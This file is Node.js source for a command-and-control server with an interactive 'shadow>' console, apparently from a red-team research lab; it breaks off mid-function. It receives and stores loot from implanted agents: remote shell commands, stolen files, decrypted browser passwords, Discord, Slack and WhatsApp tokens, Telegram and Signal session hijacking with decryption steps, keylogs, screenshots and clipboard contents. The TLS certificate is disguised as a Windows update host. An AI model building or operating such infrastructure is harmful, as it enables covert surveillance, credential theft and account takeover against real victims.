// c2-server/server.js

const WebSocket = require('ws');
const crypto = require('crypto');
const readline = require('readline');
const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const RESEARCH_MARKER = '[SHADOWLAB-RESEARCH]';
const PLAIN_PORT = parseInt(process.env.C2_PLAIN_PORT) || 8443;
const TLS_PORT = parseInt(process.env.C2_TLS_PORT) || 443;
const AUTH_TOKEN = process.env.C2_AUTH_TOKEN || crypto.randomBytes(32).toString('hex');
const COMMAND_TIMEOUT_MS = 120_000; // 2 minutes

// Exfil data directory — use DATA_DIR env var (Docker volume) or fallback to ../logs
const logsDir = process.env.DATA_DIR || path.join(__dirname, '..', 'logs');
if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });

// -- State --
const agents = new Map();
let activeAgent = null;
let commandCounter = 0;
const pendingCommands = new Map();
const exfilLog = []; // Track all data received for leakage measurement

function formatBytes(bytes) {
  if (bytes >= 1048576) return `${(bytes / 1048576).toFixed(1)} MB`;
  if (bytes >= 1024) return `${Math.round(bytes / 1024)} KB`;
  return `${bytes} B`;
}

function getFileIcon(name) {
  const ext = path.extname(name).toLowerCase();
  if (['.png', '.jpg', '.jpeg', '.gif', '.bmp'].includes(ext)) return '🖼️';
  if (['.json', '.jsonl'].includes(ext)) return '📊';
  if (['.log', '.txt'].includes(ext)) return '📝';
  if (['.db', '.sqlite'].includes(ext)) return '🗄️';
  if (['.js', '.py', '.bat', '.ps1'].includes(ext)) return '⚙️';
  return '📄';
}

// -- Auth --
function isAuthenticated(msg) {
  return msg.token === AUTH_TOKEN;
}

// -- Plain WebSocket Server --
const plainServer = http.createServer();
const plainWss = new WebSocket.Server({ server: plainServer });
plainWss.on('connection', (ws, req) => handleConnection(ws, req, 'plain'));

// -- TLS WebSocket Server --
let tlsWss;
const certPath = path.join(__dirname, 'certs', 'cert.pem');
const keyPath = path.join(__dirname, 'certs', 'key.pem');

if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
  try {
    const tlsServer = https.createServer({
      key: fs.readFileSync(keyPath),
      cert: fs.readFileSync(certPath)
    });
    tlsWss = new WebSocket.Server({ server: tlsServer });
    tlsWss.on('connection', (ws, req) => handleConnection(ws, req, 'tls'));
    tlsServer.listen(TLS_PORT, '0.0.0.0', () => {
      console.log(`  WSS (TLS) listening on port ${TLS_PORT}`);
    });
    tlsServer.on('error', (e) => {
      if (e.code === 'EACCES') {
        console.log(`[!] TLS server failed: port ${TLS_PORT} requires elevated privileges`);
        console.log('    Run with sudo/admin, or set C2_TLS_PORT to a port > 1024');
      } else {
        console.log(`[!] TLS server failed: ${e.message}`);
      }
    });
  } catch (e) {
    console.log(`[!] TLS server failed to start: ${e.message}`);
  }
} else {
  console.log('[!] TLS certs not found — TLS server disabled');
  console.log(`    Expected: ${keyPath}`);
  console.log(`    Expected: ${certPath}`);
  console.log('    Generate with: openssl req -x509 -newkey rsa:2048 -nodes \\');
  console.log("      -keyout certs/key.pem -out certs/cert.pem -days 365 -subj '/CN=telemetry.windowsupdate.local'");
}

// -- Pending command cleanup --
setInterval(() => {
  const now = Date.now();
  for (const [id, pending] of pendingCommands) {
    if (now - pending.timestamp > COMMAND_TIMEOUT_MS) {
      pendingCommands.delete(id);
    }
  }
}, 30_000);

function handleConnection(ws, req, mode) {
  const remoteAddr = req.socket.remoteAddress;
  let authenticated = false;

  ws.on('message', (data) => {
    let msg;
    try {
      msg = JSON.parse(data.toString());
    } catch (e) {
      console.log(`[!] Malformed message from ${remoteAddr}`);
      return;
    }

    // First message must be an authenticated beacon
    if (!authenticated) {
      if (msg.type !== 'beacon' || !isAuthenticated(msg)) {
        console.log(`[!] Rejected unauthenticated ${mode} connection from ${remoteAddr}`);
        ws.close(4001, 'Unauthorized');
        return;
      }
      authenticated = true;
      console.log(`\n[+] Authenticated ${mode} connection from ${remoteAddr}`);
    }

    handleAgentMessage(ws, msg, remoteAddr);
  });

  ws.on('close', () => {
    for (const [id, agent] of agents) {
      if (agent.ws === ws) {
        console.log(`\n[-] Agent ${id} disconnected`);
        agent.ws = null;
        agent.disconnectedAt = Date.now();
        break;
      }
    }
  });
}

// -- Send Command to Active Agent --
function sendCommand(cmd) {
  if (!activeAgent || !agents.has(activeAgent)) {
    console.log('  No active agent. Use "agents" and "use <id>".');
    return;
  }
  const agent = agents.get(activeAgent);
  if (!agent.ws || agent.ws.readyState !== WebSocket.OPEN) {
    console.log(`  Agent ${activeAgent} is offline`);
    return;
  }
  const id = ++commandCounter;
  cmd.id = id;
  pendingCommands.set(id, { command: cmd, timestamp: Date.now() });
  try {
    agent.ws.send(JSON.stringify(cmd));
  } catch (e) {
    console.log(`[!] Failed to send command: ${e.message}`);
    agent.ws = null;
    agent.disconnectedAt = Date.now();
    pendingCommands.delete(id);
  }
}

function persistMessage(msg, remoteAddr) {
  // Write harvest/exfil results to disk as JSONL for post-analysis
  const dominated = ['heartbeat', 'beacon'];
  if (dominated.includes(msg.type)) return;

  const logFile = path.join(logsDir, `exfil-${new Date().toISOString().split('T')[0]}.jsonl`);
  const entry = {
    timestamp: new Date().toISOString(),
    type: msg.type,
    from: remoteAddr,
    size: Buffer.byteLength(JSON.stringify(msg)),
    data: msg
  };
  try {
    fs.appendFileSync(logFile, JSON.stringify(entry) + '\n');
  } catch (e) {
    // Don't let logging failures break the C2
  }
}

function handleAgentMessage(ws, msg, remoteAddr) {
  // Log ALL received data for leakage measurement
  const msgPayload = JSON.stringify(msg);
  exfilLog.push({
    timestamp: Date.now(),
    type: msg.type,
    size: Buffer.byteLength(msgPayload),
    from: remoteAddr
  });

  // Persist harvest data to disk
  persistMessage(msg, remoteAddr);

  switch (msg.type) {
    case 'beacon': {
      const hostname = msg.hostname || 'unknown';
      const user = msg.user || 'unknown';
      const pid = msg.pid || 0;
      const agentId = `${hostname}-${user}-${pid}`;
      const beaconTime = Date.now();

      // Update existing agent or create new entry
      const existing = agents.get(agentId);
      if (existing) {
        existing.ws = ws;
        existing.lastSeen = beaconTime;
        existing.info = msg;
        existing.tier = msg.tier || existing.tier;
        existing.disconnectedAt = null;
        console.log(`\n[+] Beacon (reconnect) from ${agentId} (Tier ${msg.tier || '?'})`);
      } else {
        agents.set(agentId, {
          ws,
          info: msg,
          lastSeen: beaconTime,
          firstSeen: beaconTime,
          tier: msg.tier || 'unknown',
          disconnectedAt: null
        });
        console.log(`\n[+] Beacon from ${agentId} (Tier ${msg.tier || '?'})`);
      }
      console.log(`    Platform: ${msg.platform || '?'} (${msg.arch || '?'})`);
      console.log(`    User: ${user}@${hostname}`);
      console.log(`    Home: ${msg.homedir || '?'}`);

      if (!activeAgent) {
        activeAgent = agentId;
        console.log(`    Auto-selected as active agent`);
      }
      break;
    }

    case 'heartbeat':
      for (const [id, agent] of agents) {
        if (agent.ws === ws) {
          agent.lastSeen = Date.now();
          break;
        }
      }
      break;

    case 'exec_result': {
      const pending = pendingCommands.get(msg.id);
      if (pending) {
        const duration = Date.now() - pending.timestamp;
        console.log(`\n[*] Command result (${duration}ms):`);
        if (msg.stdout) console.log(msg.stdout);
        if (msg.stderr) console.log(`[stderr] ${msg.stderr}`);
        if (msg.error) console.log(`[error] ${msg.error}`);
        pendingCommands.delete(msg.id);
      }
      break;
    }

    case 'file_content':
      console.log(`\n[*] File: ${msg.path} (${msg.content?.length || 0} bytes)`);
      console.log('\u2500'.repeat(60));
      console.log(msg.content?.substring(0, 2000) || '[empty]');
      if (msg.content?.length > 2000) console.log(`\n... truncated (${msg.content.length} total)`);
      console.log('\u2500'.repeat(60));
      pendingCommands.delete(msg.id);
      break;

    case 'file_download': {
      const dlDir = path.join(logsDir, 'downloads');
      if (!fs.existsSync(dlDir)) fs.mkdirSync(dlDir, { recursive: true });

      const safeName = msg.filename.replace(/[^a-zA-Z0-9._-]/g, '_');
      const dlFile = path.join(dlDir, safeName);

      if (msg.chunks === 1) {
        // Single chunk — write directly
        const buf = Buffer.from(msg.data, 'base64');
        fs.writeFileSync(dlFile, buf);
        console.log(`\n[+] Downloaded: ${msg.path}`);
        console.log(`    Saved to: ${dlFile} (${formatBytes(buf.length)})`);
        pendingCommands.delete(msg.id);
      } else {
        // Multi-chunk — append
        const buf = Buffer.from(msg.data, 'base64');
        if (msg.chunk === 1) {
          fs.writeFileSync(dlFile, buf);
        } else {
          fs.appendFileSync(dlFile, buf);
        }
        const pct = Math.round((msg.chunk / msg.chunks) * 100);
        process.stdout.write(`\r[*] Downloading ${msg.filename}: chunk ${msg.chunk}/${msg.chunks} (${pct}%)`);
        if (msg.chunk === msg.chunks) {
          console.log(`\n[+] Downloaded: ${msg.path}`);
          console.log(`    Saved to: ${dlFile} (${formatBytes(msg.size)})`);
          pendingCommands.delete(msg.id);
        }
      }
      break;
    }

    case 'dir_listing':
      console.log(`\n[*] Directory: ${msg.path}`);
      for (const entry of msg.entries || []) {
        console.log(`  ${entry.isDir ? '[DIR]' : '     '} ${entry.name}`);
      }
      pendingCommands.delete(msg.id);
      break;

    case 'cred_harvest':
      console.log(`\n[*] Credential Harvest Results:`);
      for (const [name, result] of Object.entries(msg.results || {})) {
        const status = result.exists ? '\u2713 FOUND' : '\u2717 not found';
        console.log(`  ${status} \u2014 ${name}`);
        if (result.exists && result.files) {
          result.files.forEach(f => console.log(`    \u2514\u2500 ${f}`));
        }
      }
      pendingCommands.delete(msg.id);
      break;

    case 'screenshot_data':
      if (msg.data) {
        try {
          const imgBuf = Buffer.from(msg.data, 'base64');
          const imgPath = path.join(logsDir, `screenshot-${Date.now()}.png`);
          fs.writeFileSync(imgPath, imgBuf);
          const dims = msg.width && msg.height ? ` ${msg.width}x${msg.height}` : '';
          const method = msg.method ? ` [${msg.method}]` : '';
          console.log(`\n[+] Screenshot saved: ${imgPath} (${formatBytes(imgBuf.length)}${dims})${method}`);
        } catch (e) {
          console.log(`[!] Failed to save screenshot: ${e.message}`);
        }
      } else {
        console.log(`\n[!] Screenshot failed${msg.error ? ': ' + msg.error : ' (screen may be locked)'}`);
      }
      pendingCommands.delete(msg.id);
      break;

    case 'clipboard_content':
      console.log(`\n[*] Clipboard content:`);
      console.log(msg.content || '[empty]');
      pendingCommands.delete(msg.id);
      break;

    // -- Expanded Harvest Handlers (from addendum) --

    case 'browser_harvest': {
      console.log(`\n[*] Browser Harvest Results:`);
      const bhResults = msg.result || msg.results || {};

      if (bhResults.method) {
        // FFI format (flat structure)
        console.log(`  Method: ${bhResults.method}`);
        console.log(`  Browser: ${bhResults.browser || 'none found'}`);
        if (bhResults.error) {
          console.log(`  Error: ${bhResults.error}`);
        }
        const creds = bhResults.credentials || [];
        console.log(`  Credentials: ${creds.length} found`);
        for (const c of creds) {
          if (c.decrypted) {
            const preview = c.password ? c.password[0] + '*'.repeat(Math.min(c.password.length - 1, 20)) : '[empty]';
            console.log(`    ${c.url?.substring(0, 50)} | ${c.username} | ${preview} (${c.password_length} chars)`);
          } else {
            console.log(`    ${c.url?.substring(0, 50)} | ${c.username} | [${c.error || 'failed'}]`);
          }
        }
        if (bhResults.cookies_count) {
          console.log(`  Cookies: ~${bhResults.cookies_count} entries`);
        }
      } else {
        // Legacy PowerShell format (per-browser objects)
        for (const browser of ['chrome', 'edge', 'brave']) {
          if (bhResults[browser]) {
            const creds = bhResults[browser].credentials || [];
            console.log(`  ${browser}: ${creds.length} credentials decrypted`);
          }
        }
      }
      console.log(`  Total exfil: ${(Buffer.byteLength(msgPayload) / 1024).toFixed(1)} KB`);
      pendingCommands.delete(msg.id);
      break;
    }

    case 'discord_harvest': {
      console.log(`\n[*] Discord Harvest Results:`);
      const dResults = msg.result || msg.results || {};
      const dStatus = dResults.token ? '\u2713 token found' : '\u2717 no token';
      console.log(`  Discord: ${dStatus}`);
      if (dResults.token) {
        console.log(`  Token: ${dResults.token}`);
      }
      if (dResults.paths_checked) {
        console.log(`  Paths checked: ${dResults.paths_checked.join(', ')}`);
      }
      if (dResults.error) {
        console.log(`  Error: ${dResults.error}`);
      }
      console.log(`  Total exfil: ${Buffer.byteLength(msgPayload)} bytes`);
      pendingCommands.delete(msg.id);
      break;
    }

    case 'telegram_harvest': {
      console.log(`\n[*] Telegram Harvest Results:`);
      const tResults = msg.result || msg.results || {};
      const tStatus = tResults.installed ? '\u2713 installed' : '\u2717 not installed';
      console.log(`  Telegram: ${tStatus}`);
      if (tResults.key_data_found) {
        console.log(`  key_datas: found (${tResults.key_data_size} bytes)`);
      }
      if (tResults.session_files?.length) {
        console.log(`  Session files: ${tResults.session_files.length}`);
        for (const sf of tResults.session_files) {
          console.log(`    ${sf.name} (${sf.size ? (sf.size / 1024).toFixed(1) + ' KB' : sf.files + ' files'})`);
        }
      }
      if (tResults.hijack_possible) {
        console.log(`  Session hijack: POSSIBLE (bypasses 2FA)`);
      }
      if (tResults.exfil_data) {
        const exfilKeys = Object.keys(tResults.exfil_data);
        const exfilSize = Buffer.byteLength(JSON.stringify(tResults.exfil_data));
        console.log(`  Exfiltrated: ${exfilKeys.length} items (${(exfilSize / 1024).toFixed(1)} KB)`);
        // Save session data to disk for potential replay
        try {
          const tgDir = path.join(logsDir, 'telegram-session');
          if (!fs.existsSync(tgDir)) fs.mkdirSync(tgDir, { recursive: true });
          for (const [name, data] of Object.entries(tResults.exfil_data)) {
            if (typeof data === 'string') {
              // Single file (key_datas)
              fs.writeFileSync(path.join(tgDir, name), Buffer.from(data, 'base64'));
            } else {
              // Session directory
              const dirPath = path.join(tgDir, name);
              if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
              for (const [fname, fdata] of Object.entries(data)) {
                fs.writeFileSync(path.join(dirPath, fname), Buffer.from(fdata, 'base64'));
              }
            }
          }
          console.log(`  Session files saved to: ${tgDir}`);
        } catch (e) {
          console.log(`  [!] Failed to save session files: ${e.message}`);
        }
      }
      console.log(`  Total exfil: ${(Buffer.byteLength(msgPayload) / 1024).toFixed(1)} KB`);
      pendingCommands.delete(msg.id);
      break;
    }

    case 'messaging_harvest': {
      console.log(`\n[*] Messaging Harvest Results:`);
      const mhResults = msg.result || msg.results || {};
      const apps = mhResults.apps || {};
      console.log(`  Apps found: ${mhResults.apps_found || 0}`);
      for (const [appName, info] of Object.entries(apps)) {
        const status = info.installed ? '\u2713 installed' : '\u2717 not found';
        const size = info.installed && info.total_size
          ? ` (${(info.total_size / 1024 / 1024).toFixed(1)} MB)`
          : '';
        console.log(`  ${appName}: ${status}${size}`);
        if (info.installed && info.key_files_status) {
          for (const [file, fInfo] of Object.entries(info.key_files_status)) {
            const fStatus = fInfo.readable ? '\u2713 readable' : '\u2717 locked';
            console.log(`    ${file}: ${fStatus}${fInfo.size ? ` (${fInfo.size} bytes)` : ''}`);
          }
        }
      }
      if (mhResults.exfil_size_bytes) {
        console.log(`  Total exfil: ${(mhResults.exfil_size_bytes / 1024).toFixed(1)} KB`);
      }
      pendingCommands.delete(msg.id);
      break;
    }

    case 'signal_harvest': {
      console.log(`\n[*] Signal Harvest Results:`);
      const shResults = msg.result || msg.results || {};
      if (shResults.key_found) {
        console.log(`  Encryption key: \u2713 extracted from config.json`);
      } else {
        console.log(`  Encryption key: \u2717 not found`);
      }
      if (shResults.db_decrypted) {
        console.log(`  Database: \u2713 decrypted (${shResults.message_count || 0} messages)`);
        console.log(`  Conversations: ${shResults.conversation_count || 0}`);
      } else {
        console.log(`  Database: \u2717 decrypt failed or not found`);
      }
      console.log(`  Total exfil: ${(Buffer.byteLength(msgPayload) / 1024).toFixed(1)} KB`);
      pendingCommands.delete(msg.id);
      break;
    }

    case 'signal_exfil': {
      console.log(`\n[*] Signal Exfil Results:`);
      const seResults = msg.result || {};
      if (!seResults.installed) {
        console.log('  Signal: not installed');
        pendingCommands.delete(msg.id);
        break;
      }

      // Key
      if (seResults.key) {
        const source = seResults.key_source === 'dpapi_decrypted'
          ? '(DPAPI-decrypted from encryptedKey)'
          : '(plaintext from config.json)';
        console.log(`  Encryption key: \u2713 ${seResults.key}`);
        console.log(`  Key source: ${source}`);
      } else {
        console.log(`  Encryption key: \u2717 not found`);
        if (seResults.key_error) console.log(`  Key error: ${seResults.key_error}`);
        if (seResults.encrypted_key) console.log(`  Encrypted key present but DPAPI decrypt failed — must run on target machine`);
      }

      // Config
      if (seResults.config) {
        console.log(`  config.json: \u2713 exfiltrated`);
      }

      // Save files
      const sigDir = path.join(logsDir, 'signal-session');
      if (!fs.existsSync(sigDir)) fs.mkdirSync(sigDir, { recursive: true });

      // Save config.json
      if (seResults.config) {
        fs.writeFileSync(path.join(sigDir, 'config.json'), seResults.config);
        console.log(`  Saved: config.json`);
      }

      // Save decrypted key for easy reference
      if (seResults.key) {
        fs.writeFileSync(path.join(sigDir, 'decrypted-key.txt'), seResults.key);
        console.log(`  Saved: decrypted-key.txt`);
      }

      // Save db.sqlite
      if (seResults.db) {
        const dbBuf = Buffer.from(seResults.db.data, 'base64');
        fs.writeFileSync(path.join(sigDir, 'db.sqlite'), dbBuf);
        console.log(`  Saved: db.sqlite (${formatBytes(seResults.db.size)})`);
      } else {
        console.log(`  Database: \u2717 not found`);
      }

      // Save WAL
      if (seResults.wal) {
        const walBuf = Buffer.from(seResults.wal.data, 'base64');
        fs.writeFileSync(path.join(sigDir, 'db.sqlite-wal'), walBuf);
        console.log(`  Saved: db.sqlite-wal (${formatBytes(seResults.wal.size)})`);
      }

      // Attachments info
      if (seResults.attachment_count) {
        console.log(`  Attachments on target: ${seResults.attachment_count} files (not exfilled — use download command)`);
      }

      console.log(`  Session files saved to: ${sigDir}`);
      console.log(`  Total exfil: ${(Buffer.byteLength(msgPayload) / 1024).toFixed(1)} KB`);

      if (seResults.key) {
        console.log(`\n  To decrypt: sqlcipher ${path.join(sigDir, 'db.sqlite')}`);
        console.log(`    PRAGMA key = "x'${seResults.key}'";`);
        console.log(`    .tables`);
      }
      pendingCommands.delete(msg.id);
      break;
    }

    case 'harvest_all': {
      console.log(`\n[*] Full Harvest Results:`);
      const haResults = msg.results || {};
      console.log(`  Total harvest time: ${haResults.total_ms || 0}ms`);
      console.log(`  Timing breakdown:`);
      // Timing keys end in _ms
      for (const [key, val] of Object.entries(haResults)) {
        if (key.endsWith('_ms') && key !== 'total_ms') {
          console.log(`    ${key.replace('_ms', '')}: ${val}ms`);
        }
      }
      // Discord
      if (haResults.discord) {
        const status = haResults.discord.token ? '\u2713 token found' : '\u2717 no token';
        console.log(`  Discord: ${status}`);
      }
      // Telegram
      if (haResults.telegram) {
        const status = haResults.telegram.installed ? '\u2713 installed' : '\u2717 not installed';
        const hijack = haResults.telegram.hijack_possible ? ' (session hijack POSSIBLE)' : '';
        console.log(`  Telegram: ${status}${hijack}`);
      }
      // Messaging scan
      if (haResults.messaging) {
        console.log(`  Messaging apps found: ${haResults.messaging.apps_found || 0}`);
      }
      // Slack
      if (haResults.slack) {
        console.log(`  Slack: ${haResults.slack.tokens?.length || 0} tokens found`);
      }
      // Browser
      if (haResults.browser) {
        const creds = haResults.browser.chrome?.credentials?.length || 0;
        console.log(`  Browser creds: ${creds} decrypted`);
      }
      // Signal
      if (haResults.signal) {
        const status = haResults.signal.key_found ? '\u2713 key found' : '\u2717 not found';
        console.log(`  Signal: ${status}`);
      }
      if (haResults.total_exfil_bytes) {
        console.log(`  Total exfil payload: ${(haResults.total_exfil_bytes / 1024).toFixed(1)} KB`);
      }
      pendingCommands.delete(msg.id);
      break;
    }

    case 'keylog_started':
      console.log(`\n[*] Keylogger started on agent`);
      console.log(`    Method: ${msg.method || 'powershell'}`);
      console.log(`    Duration: ${msg.duration}s`);
      console.log(`    Log path: ${msg.logPath}`);
      if (msg.already_running) console.log(`    (already running, PID: ${msg.pid})`);
      pendingCommands.delete(msg.id);
      break;

    case 'keylog_data': {
      const klData = msg.data || msg.content || '';
      const isFinal = msg.final || false;
      const klKeys = msg.total_keys || 0;

      // Save to log file on C2 host
      if (klData) {
        const klLogFile = path.join(logsDir, `keylog-${new Date().toISOString().split('T')[0]}.log`);
        try {
          fs.appendFileSync(klLogFile, klData);
        } catch (e) {}
      }

      if (isFinal) {
        console.log(`\n[*] Keylogger finished: ${klKeys} keys captured`);
        console.log(`    Duration: ${((msg.duration_ms || 0) / 1000).toFixed(0)}s`);
      } else {
        console.log(`\n[*] Keylog stream (${klData.length} chars, ${klKeys} keys total):`);
      }
      if (klData) {
        console.log('\u2500'.repeat(60));
        console.log(klData.substring(0, 1000));
        if (klData.length > 1000) console.log(`\n... truncated (${klData.length} total chars)`);
        console.log('\u2500'.repeat(60));
      }
      const klLogPath = path.join(logsDir, `keylog-${new Date().toISOString().split('T')[0]}.log`);
      console.log(`    Log: ${klLogPath}`);
      break;
    }

    case 'keylog_stopped':
      console.log(`\n[*] Keylogger stopped on agent`);
      pendingCommands.delete(msg.id);
      break;

    case 'slack_harvest': {
      console.log(`\n[*] Slack Harvest Results:`);
      const slResults = msg.result || msg.results || {};
      if (!slResults.installed) {
        console.log('  Slack: not installed');
      } else {
        console.log(`  Tokens found: ${slResults.tokens?.length || 0}`);
        for (const t of (slResults.tokens || [])) {
          console.log(`    ${t.type}: ${t.token}`);
        }
        if (slResults.workspaces?.length) {
          console.log(`  Workspaces:`);
          for (const ws of slResults.workspaces) {
            console.log(`    ${ws.name} (${ws.domain}.slack.com)`);
          }
        }
        if (slResults.cookies_accessible) {
          const sizeStr = slResults.cookies_size ? ` (${(slResults.cookies_size / 1024).toFixed(1)} KB)` : '';
          console.log(`  Cookies DB: accessible${sizeStr}`);
        }
      }
      console.log(`  Total exfil: ${Buffer.byteLength(msgPayload)} bytes`);
      pendingCommands.delete(msg.id);
      break;
    }

    case 'whatsapp_harvest': {
      console.log(`\n[*] WhatsApp Harvest Results:`);
      const waResults = msg.result || msg.results || {};
      if (!waResults.installed) {
        console.log('  WhatsApp: not installed');
      } else {
        console.log(`  Install type: ${waResults.install_type}`);
        console.log(`  Path: ${waResults.path}`);
        console.log(`  LevelDB files: ${waResults.leveldb_files || 0}`);
        console.log(`  Tokens found: ${waResults.tokens?.length || 0}`);
        for (const t of (waResults.tokens || [])) {
          console.log(`    ${t.type} (${t.length} chars): ${t.value.substring(0, 80)}${t.length > 80 ? '...' : ''}`);
        }
        if (waResults.session_db) {
          if (waResults.session_db.data) {
            console.log(`  session.db: exfiltrated (${(waResults.session_db.size / 1024).toFixed(1)} KB)`);
          } else {
            console.log(`  session.db: ${waResults.session_db.skipped || waResults.session_db.error || 'not found'}`);
          }
        }
        if (waResults.session_files?.length) {
          console.log(`  Session key dirs: ${waResults.session_files.length}`);
          for (const sf of waResults.session_files) {
            if (sf.databases?.length) {
              console.log(`    ${sf.name}: ${sf.databases.length} databases (${sf.databases.map(d => d.name).join(', ')})`);
            }
            if (sf.transfer_count) {
              const txSize = sf.transfers?.reduce((sum, t) => sum + (t.size || 0), 0) || 0;
              console.log(`    ${sf.name}: ${sf.transfer_count} transfers (${formatBytes(txSize)})`);
            }
          }
        }
        if (waResults.indexeddb_stores?.length) {
          console.log(`  IndexedDB stores: ${waResults.indexeddb_stores.join(', ')}`);
        }
        if (waResults.indexeddb_files?.length) {
          console.log(`  IndexedDB files: ${waResults.indexeddb_files.length}`);
          if (waResults.indexeddb_size) {
            console.log(`  IndexedDB size: ${(waResults.indexeddb_size / 1024).toFixed(1)} KB`);
          }
          if (waResults.indexeddb_data && typeof waResults.indexeddb_data === 'object') {
            const fileCount = Object.keys(waResults.indexeddb_data).filter(k => typeof waResults.indexeddb_data[k] === 'string').length;
            console.log(`  IndexedDB exfiltrated: ${fileCount} files`);
          }
        }
        if (waResults.indexeddb_skipped) {
          console.log(`  IndexedDB: ${waResults.indexeddb_skipped}`);
        }
        if (waResults.cookies_accessible) {
          const sizeStr = waResults.cookies_size ? ` (${(waResults.cookies_size / 1024).toFixed(1)} KB)` : '';
          console.log(`  Cookies: accessible${sizeStr}`);
        }
        // Save session data and IndexedDB to disk
        if (waResults.session_db?.data || waResults.session_files?.length || waResults.indexeddb_data) {
          try {
            const waDir = path.join(logsDir, 'whatsapp-session');
            if (!fs.existsSync(waDir)) fs.mkdirSync(waDir, { recursive: true });
            if (waResults.session_db?.data) {
              fs.writeFileSync(path.join(waDir, 'session.db'),
                Buffer.from(waResults.session_db.data, 'base64'));
              if (waResults.session_db_wal?.data) {
                fs.writeFileSync(path.join(waDir, 'session.db-wal'),
                  Buffer.from(waResults.session_db_wal.data, 'base64'));
              }
            }
            if (waResults.session_files) {
              const sessDir = path.join(waDir, 'sessions');
              if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });
              for (const sf of waResults.session_files) {
                if (sf.files) {
                  // Session directory with key files, databases, transfers
                  const sfDir = path.join(sessDir, sf.name);
                  if (!fs.existsSync(sfDir)) fs.mkdirSync(sfDir, { recursive: true });
                  for (const [fname, fdata] of Object.entries(sf.files)) {
                    fs.writeFileSync(path.join(sfDir, fname), Buffer.from(fdata, 'base64'));
                  }
                  // Save databases (contacts.db, mediaDownloads.db, etc.)
                  if (sf.databases) {
                    for (const db of sf.databases) {
                      fs.writeFileSync(path.join(sfDir, db.name), Buffer.from(db.data, 'base64'));
                    }
                    console.log(`  Session ${sf.name}: ${sf.databases.length} databases saved`);
                  }
                  // Save transfer files (user-downloaded media/documents)
                  if (sf.transfers && sf.transfers.length > 0) {
                    const txDir = path.join(sfDir, 'transfers');
                    if (!fs.existsSync(txDir)) fs.mkdirSync(txDir, { recursive: true });
                    for (const tx of sf.transfers) {
                      const monthDir = path.join(txDir, tx.month);
                      if (!fs.existsSync(monthDir)) fs.mkdirSync(monthDir, { recursive: true });
                      fs.writeFileSync(path.join(monthDir, tx.filename), Buffer.from(tx.data, 'base64'));
                    }
                    const txSize = sf.transfers.reduce((sum, t) => sum + (t.size || 0), 0);
                    console.log(`  Session ${sf.name}: ${sf.transfers.length} transfers saved (${formatBytes(txSize)})`);
                  }
                } else if (sf.data) {
                  fs.writeFileSync(path.join(sessDir, sf.name), Buffer.from(sf.data, 'base64'));
                }
              }
            }
            // Save IndexedDB LevelDB files
            if (waResults.indexeddb_data && typeof waResults.indexeddb_data === 'object') {
              const idbDir = path.join(waDir, 'indexeddb');
              if (!fs.existsSync(idbDir)) fs.mkdirSync(idbDir, { recursive: true });
              let savedCount = 0;
              for (const [fname, fdata] of Object.entries(waResults.indexeddb_data)) {
                if (typeof fdata === 'string') {
                  // Base64-encoded file content
                  fs.writeFileSync(path.join(idbDir, fname), Buffer.from(fdata, 'base64'));
                  savedCount++;
                }
              }
              if (savedCount) console.log(`  IndexedDB: ${savedCount} files saved to: ${idbDir}`);
            }
            console.log(`  Session files saved to: ${waDir}`);
          } catch (e) {
            console.log(`  [!] Failed to save session files: ${e.message}`);
          }
        }
      }
      console.log(`  Total exfil: ${(Buffer.byteLength(msgPayload) / 1024).toFixed(1)} KB`);
      pendingCommands.delete(msg.id);
      break;
    }
  }
}

// -- Interactive CLI --
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: 'shadow> '
});

rl.on('line', (line) => {
  const input = line.trim();
  const parts = input.split(/\s+/);
  const command = parts[0]?.toLowerCase();

  switch (command) {
    case 'help':
      console.log(`
  Agent Management:
    agents              List online agents (use "agents all" to include offline)
    use <id>            Select active agent
    info                Show active agent details
    prune               Remove offline agents from list

  Remote Commands:
    exec <command>      Execute shell command on agent
    read <path>         Read text file from agent (truncated to 100KB)
    download <path>     Download any file from agent (binary, chunked, saved to data volume)
    dl <path>           Alias for download
    ls <path>           List directory on agent

  Harvesting:
    harvest             Credential files (SSH, AWS, env, etc.)
    harvest_browser     Chrome/Edge passwords via FFI DPAPI (bypasses Defender)
    harvest_messaging   Scan all messaging apps for accessible data
    harvest_signal      Signal database decrypt (plaintext key + SQLCipher)
    harvest_all         FULL AUTOMATED HARVEST -- everything at once with timing

  App-Specific:
    exfil_discord       Discord auth token (< 200 bytes exfil)
    exfil_telegram      Telegram session hijack (exfils key_datas + session dirs)
    exfil_slack         Slack workspace tokens from LevelDB
    exfil_whatsapp      WhatsApp session + tokens (UWP and Electron)
    exfil_signal        Signal encryption key + encrypted database

  Surveillance:
    keylog_start [secs] Start FFI keylogger (default 60s, bypasses Defender)
    keylog_stop         Stop active keylogger + retrieve captured data
    screenshot          Capture agent's screen
    clipboard           Read agent's clipboard

  Measurement:
    exfil-stats         Data exfiltration metrics
    timeline [n]        Detection event timeline (default last 20)

  Lab Tools:
    killall             Kill switch all agents
    kill                Kill active agent

  Local Data (exfil volume):
    data [path]         Browse exfil data directory (default: root)
    cat <path>          Print local exfil file contents
    data-size           Show total exfil data size

  System:
    token               Show auth token (for agent config)
    quit                Shutdown C2 server
      `);
      break;

    case 'agents': {
      const showAll = parts[1] === 'all';
      if (agents.size === 0) {
        console.log('  No agents connected');
      } else {
        let onlineCount = 0;
        let offlineCount = 0;
        for (const [id, agent] of agents) {
          const online = agent.ws && agent.ws.readyState === WebSocket.OPEN;
          if (online) onlineCount++; else offlineCount++;
          if (!online && !showAll) continue;
          const status = online ? '\u25cf online' : '\u25cb offline';
          const active = id === activeAgent ? ' \u2190 active' : '';
          const ago = Math.round((Date.now() - agent.lastSeen) / 1000);
          console.log(`  ${status} ${id} [T${agent.tier}] (${ago}s ago)${active}`);
        }
        console.log(`  (${onlineCount} online, ${offlineCount} offline${!showAll && offlineCount ? ' — "agents all" to show' : ''})`);
      }
      break;
    }

    case 'prune': {
      let pruned = 0;
      for (const [id, agent] of agents) {
        if (!agent.ws || agent.ws.readyState !== WebSocket.OPEN) {
          if (id === activeAgent) activeAgent = null;
          agents.delete(id);
          pruned++;
        }
      }
      console.log(`  Pruned ${pruned} offline agent(s)`);
      break;
    }

    case 'use': {
      const targetId = parts.slice(1).join(' ');
      if (agents.has(targetId)) {
        activeAgent = targetId;
